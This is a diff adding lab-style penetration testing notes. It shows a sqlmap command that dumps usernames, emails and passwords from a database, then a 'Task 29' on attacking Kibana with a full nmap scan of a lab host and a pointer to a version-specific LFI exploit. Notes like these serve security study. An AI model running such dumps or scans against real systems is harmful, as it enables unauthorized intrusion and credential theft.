@@ -1646,3 +1646,92 @@ SQL Injection
     ```
     sqlmap -r test.txt -D [db_name] -T [table_name] -C username,email,password --dump
     ```
+* Now with the contents of the db you have creds to login
+
+# Task 29
+Exploiting Kibana
+
+* Enumerate - nmap
+    ```
+    nmap -A -T4 10.10.254.220 -p- | tee nmap.txt                                                                                 
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-02 18:25 EST                                                                                                                  
+    Nmap scan report for 10.10.254.220                                                                                                                                               
+    Host is up (0.22s latency).                                                                                                                                                      
+    Not shown: 65529 closed ports                                                                                                                                                    
+    PORT     STATE SERVICE   VERSION                                                                                                                                                 
+    22/tcp   open  ssh       OpenSSH 7.4 (protocol 2.0)                                                                                                                              
+    | ssh-hostkey:                                                                                                                                                                   
+    |   2048 0a:ee:6d:36:10:72:ce:f0:ef:40:9e:63:52:a9:86:44 (RSA)                                                                                                                   
+    |   256 11:6e:8f:7f:15:66:e3:03:b1:c4:55:f8:e7:bb:59:23 (ECDSA)                                                                                                                  
+    |_  256 b3:12:7a:7f:ac:89:72:c9:25:88:96:20:ad:c7:5b:4a (ED25519)                                                                                                                
+    111/tcp  open  rpcbind   2-4 (RPC #100000)                                                                                                                                       
+    | rpcinfo:                                                                                                                                                                       
+    |   program version    port/proto  service                                                                                                                                       
+    |   100000  2,3,4        111/tcp   rpcbind                                                                                                                                       
+    |   100000  2,3,4        111/udp   rpcbind                                                                                                                                       
+    |   100000  3,4          111/tcp6  rpcbind                                                                                                                                       
+    |_  100000  3,4          111/udp6  rpcbind                                                                                                                                       
+    5601/tcp open  esmagent?                                                                                                                                                         
+    | fingerprint-strings:                                                                                                                                                           
+    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:                  
+    |     HTTP/1.1 400 Bad Request                                                                                                                                                   
+    |   FourOhFourRequest:                                                                                                                                                           
+    |     HTTP/1.1 404 Not Found                                                                                                                                                     
+    |     kbn-name: kibana                                                                                                                                                           
+    |     kbn-xpack-sig: 5a29ca259924bec4872ad69d3677ec71                                                                                                                            
+    |     content-type: application/json; charset=utf-8                                                                                                                              
+    |     cache-control: no-cache                                                                                                                                                    
+    |     content-length: 60                                                                                                                                                         
+    |     Date: Tue, 02 Mar 2021 23:39:24 GMT                                                                                                                                        
+    |     Connection: close                                                                                                                                                          
+    |     {"statusCode":404,"error":"Not Found","message":"Not Found"}
+    |   GetRequest: 
+    |     HTTP/1.1 200 OK
+    |     kbn-name: kibana
+    |     kbn-xpack-sig: 5a29ca259924bec4872ad69d3677ec71
+    |     cache-control: no-cache
+    |     content-type: text/html; charset=utf-8 
+    |     content-length: 217
+    |     accept-ranges: bytes
+    |     Date: Tue, 02 Mar 2021 23:39:18 GMT
+    GetRequest: 
+    |     HTTP/1.1 200 OK
+    |     kbn-name: kibana
+    |     kbn-xpack-sig: 5a29ca259924bec4872ad69d3677ec71
+    |     cache-control: no-cache
+    |     content-type: text/html; charset=utf-8 
+    |     content-length: 217
+    |     accept-ranges: bytes
+    |     Date: Tue, 02 Mar 2021 23:39:18 GMT
+    |     Connection: close
+    |     <script>var hashRoute = '/app/kibana'; 
+    |     defaultRoute = '/app/kibana';
+    |     hash = window.location.hash;
+    |     (hash.length) {
+    |     window.location = hashRoute + hash;
+    |     else {
+    |     window.location = defaultRoute;
+    |     }</script>
+    |   HTTPOptions: 
+    |     HTTP/1.1 404 Not Found
+    |     kbn-name: kibana
+    |     kbn-xpack-sig: 5a29ca259924bec4872ad69d3677ec71
+    |     content-type: application/json; charset=utf-8
+    |     cache-control: no-cache
+    |     content-length: 38
+    |     Date: Tue, 02 Mar 2021 23:39:18 GMT
+    |     Connection: close
+    |_    {"statusCode":404,"error":"Not Found"} 
+    8000/tcp open  http      SimpleHTTPServer 0.6 (Python 3.7.4)
+    |_http-server-header: SimpleHTTP/0.6 Python/3.7.4
+    |_http-title: Directory listing for /
+    9200/tcp open  http      Elasticsearch REST API 6.4.2 (name: sn6hfBl; cluster: elasticsearch; Lucene 7.4.0)
+    | http-methods: 
+    |_  Potentially risky methods: DELETE
+    |_http-title: Site doesn't have a title (application/json; charset=UTF-8).
+    9300/tcp open  vrace?
+    | fingerprint-strings: 
+    |   FourOhFourRequest, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+    |_    This is not an HTTP port
+    ```
+* From here you can check the return page on port 8000 which is a log file for Kibana.  That log will be used when you run a LFI exploit particular to the Kibana version running on port 5601 by taking advantage of the console
